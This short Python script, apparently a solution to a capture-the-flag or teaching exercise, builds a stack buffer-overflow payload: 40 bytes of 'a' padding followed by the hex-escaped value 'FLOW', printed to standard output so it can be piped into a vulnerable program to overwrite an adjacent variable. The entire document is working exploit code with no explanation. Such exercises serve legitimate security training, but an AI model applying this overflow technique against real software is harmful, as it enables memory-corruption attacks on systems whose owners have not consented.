fill_with_a = "a" * 40

valeur_v5 = "\x46\x4C\x4F\x57" 

payload =  fill_with_a + valeur_v5

import sys
sys.stdout.write(payload)